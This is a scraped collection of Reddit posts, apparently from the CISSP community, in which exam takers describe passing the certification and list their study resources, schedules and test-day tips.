* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

One recommendation, scores of the practice questions is not relevant, I was getting 40%-50% in Luke questions, which was kind of demotivation for me, so I just completed them without looking at the result.

Still, I managed to passed at 100Q, I was still feeling that I am not fully prepared (even after passing the exam :D )... so you will be never prepared the exam....

&#x200B;

The new Questions of Sybex Official guide are better than previous version.

&#x200B;

Best of luck for your studies....

1394,osz1a8,Provisionally passed the CISSP at 100 questions today,"Hello everyone,

&#x200B;

I studied for the exam for maybe 2 days and did a cramming session last night of some quizlet questions, read through eric conrad's 11th hour, reviewed concepts in the official study guide I didn't understand, watched youtube videos, and provisionally passed the exam at 100 questions. Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

\- Sybex Official Study Guide **( reviewed only concepts I didn't understand quickly)**

\- [CISSP Exam Cram videos](https://www.youtube.com/watch?v=8TdL16yYNd0&list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD&ab_channel=InsideCloudandSecurity) by Inside Cloud Security **(Awesome playlist, highly recommend!)**

1395,oxsg62,CISSP passed after 150 questions,"Hi All,

I have passed the exam today thanks to the resources I got from the community!

I took a classroom CISSP course at the beginning of the year and forgot about the exam. 2 weeks ago I decided to take it on and I passed on 1st try :). 

I started my prep with Cybrary free course from Kelly Handerhan which was quite good, but I liked other videos better :)

[https://www.cybrary.it/course/cissp/](https://www.cybrary.it/course/cissp/)

&#x200B;

Then I went through Mindmaps and CISSP Exam Cram:

[https://www.youtube.com/c/DestinationCertification/playlists](https://www.youtube.com/c/DestinationCertification/playlists) [https://www.youtube.com/c/InsideAzureManagement/playlists](https://www.youtube.com/c/InsideAzureManagement/playlists)  
  

I think I mostly passed thanks to those youtube courses. I liked Pete Zerger's videos the most. 

What's the most important: I do not recommend taking my approach. I passed but I think I was close to failing as I had to go through 150 questions. Take more time to prepare ;)",2021-08-04
1396,p34fft,Passed!,"Well, it's provisional, but I'll take it. I made it to 100 questions at around an hour and ten minutes. I thought that I was going out to the front desk to get the paperwork saying I failed - didn't even turn over the printout. 

I got outside the office and almost fell over when I saw the congratulations. 

A huge thanks to this great community for all the tips and study resources!",2021-08-12
1397,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.  
   *changed some formatting. If you have any questions DM me. I’ll judge what I can and can’t tell you.",2021-08-13
1398,ovd9rx,PASSED AT 150,"As the title says, my heart was pounding, sweat was flowing, and the questions kept coming. last year I did 4k study questions and didn't read the book, nor had the right managerial mindset, and got to question 129 only to fail. this year I did another 4k study questions but this time instead of Sybex online exams I used cccure and actually read the book (sorta skimmed it tbh) but most importantly I had a mindset that I was there to advise and not fix, and I made sure I picked an answer that was 'end game' and that encompassed technical steps that were listed as separate answers. had to go all the way to 150 questions and completely freaked the entire time. one other difference this time was that I asked to pull my mask down while at my station so I could actually breathe normally. that helped a lot!

Woo! so excited!!!!!",2021-07-31
1399,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
1400,p2apwi,Passed CISSP exam in first attempt,"Hi All,

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

**Exam day -** 

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11
1401,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
1402,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

Edit: Professional background— helpdesk 2 years, systems engineer 3 years for an MSP. Hands-on experience in virtualization, networking, patch management, server management, systems provisioning, etc and for the last 6 months heavily focused on cyber security.",2021-08-20
1403,p209gl,Passed using only free military resources,"So first up, I passed today at 100 questions in 80 minutes.  And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too. Disclaimer: I do have a bit of background in IT project management and cybersecurity, but still I think these resources are more than enough    
  
* Udemy.  [DigitalU.]( https://digitalu.udemy.com) So the Air Force is paying for an business license and you can use your .mil email to register and say you are in the AF. [Thor Pedersen]( https://www.udemy.com/user/thorpedersen/) covers a lot of the CISSP material.
* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).
  
And there you have it--a somewhat easy guide to use for CISSP or really any certification. Also 2 other free resources I used were [Destination certification,]( https://www.youtube.com/c/DestinationCertification/playlists) which provided a decent overview/review (though I wouldn't use it for much beyond that). And Isc2’s [Glossary,]( https://www.isc2.org/Certifications/CISSP/CISSP-Student-Glossary) to just ensure you are operating with the same language.",2021-08-10
1404,ou1fmb,"Passed this am at about 50 minutes or so, all 150 questions","Provisionally passed this AM on my first attempt. The test took me about 50 minutes or so. I was out of the testing facility in my car leaving by 9AM and I was first in line to start the test at 8.

I have been working in cyber security roles for well over 6 years the financial services industry. I studied very casually the Sybex book for about  4 months on and off for an hour or two a day. I do not consider myself technically minded at all or have been in technical roles.  I didn't feel good about a-lot of the questions, but was able to at least choose between two responses where I felt reasonably comfortable.  No math or memorization was required, but it does require knowing lot of the technical term definitions as a baseline.

I completed all 150 questions.",2021-07-29
1405,pabhis,Provisionally passed! Here's what worked for me.,"I provisionally passed!  I am posting this to give back because I found these kinds of posts motivating when I was preparing.  Also, it's a little cathartic.  Of course, your experience will be different but here's what worked for me.

For context, I have around 15 years of experience in cyber security technical and management roles, and had just never got around to doing the test.  Like others, booking a date helped sharpen my focus.  

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

I've provisionally passed the CISSP exam on 1st attempt.

On the ISC2 website, it might take up to 8 weeks... until the official confirmation comes out. Jeez...

150 questions, in 143 mins.

Previously I passed the CISSP Review and holding an Active EC-Council CCISO certificate, so the challenge was NOT so bothersome or struggling, with all due respect to test takers.

The only challenge I had was the size of the bottle which I had to urinate for not leaving the test desk lol... Have you faced a bottle that is almost full and still, you've LOT to go...

Almost ruined the ground and my pant. \^\^

The exam is what everyone says, it's hard and grueling but i approached it with a mangers mindset and got the job done!

For anyone who is struggling please know that I failed this exam before but this group inspired me to keep going, so thanks you all. 

For studying, i used a wide variety of material including a one week intense bootcamp which was very expensive - all paid for by work. If honest, I think the best was Thor Peterson online material with questions and Boson.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads. 

Now good luck to anyone on their journey.

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

In between the years after certified in CISSP, I have also certified in ISACA's 5 CXXX exams.

And should I say ""graduate"" from ISC2?

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken).

1415,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12
1416,ou390s,Passed this morning at 100q,"I have 24 years of IT experience and about 15 years in IT Security.  I've done everything from being a cable-jockey in 1997 straight out of high school to my current role of Deputy CISO for a large hospital.  I obtained the CISM in 2019.

My organization paid for an ISC(2) bootcamp and I had a fantastic instructor who provided excellent examples of ""demystifying"" complex subjects like encryption algorithms and frameworks.  I attended the bootcamp last week.

I only used the book as referenced by my bootcamp instructor and then occasionally during the ISC(2) official practice exams to review information that I missed.  I didn't read it cover-to-cover.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

I am so relieved to have it behind me... and want to encourage those of you that are planning to take it, book the exam now.  Having that ""deadline"" helps with the mental aspect of prepping.  You HAVE to do it if you have an exam appointment.

I have no factual background in IT or cybersecurity (I did get SEC+ in March). I’m an active duty Soldier who’s about to retire, and my specialty is in tactical radios and COMSEC. What probably helped me out the most was that I’d been a “manager” for almost 18 years. I do have pretty good knowledge of symmetric and asymmetric keys as a COMSEC manager, but that’s been my experience for the past 20 years.

I passed on my first attempt at 150 questions. I made sure to read everything super slow, and I took the entire three hours.

I used a ton of sources to make up for my experience and lack of knowledge.

Sources I used:

Study Notes and Theory - best overall source for content. The website and Facebook group are phenomenal. 

How to Think Like a Manager by Luke Ahmed - the 25 questions helped me with the manager mindset. Excellent!

Mike Chapple’s LinkedIn course - does a great job of delivering content, then applying it to real-world scenarios 

Sybex 8th & 9th editions 
Sybex Official questions
Shon Harris AIO
Wentz Wu The Effective CISSP
11th-hour study guide
Cissprep.net questions
Destination Certification videos by Rob Witcher
Kelly Handerhan videos
Prabh Nair’s YouTube videos

I used the Pomodoro method for my study routine.

I also used Anki a lot and this subReddit group.

The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

Those were my top three resources! But I needed all of them to pass!

1421,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.

1424,oxbqfd,Passed my CISSP today,"Hey all,

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

Good luck with your exam!",2021-08-03

As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter. I also read part of the 11th Hour study guide and went through some of the CISSP Practice Exam book by Shon Harris, like maybe a third of it.

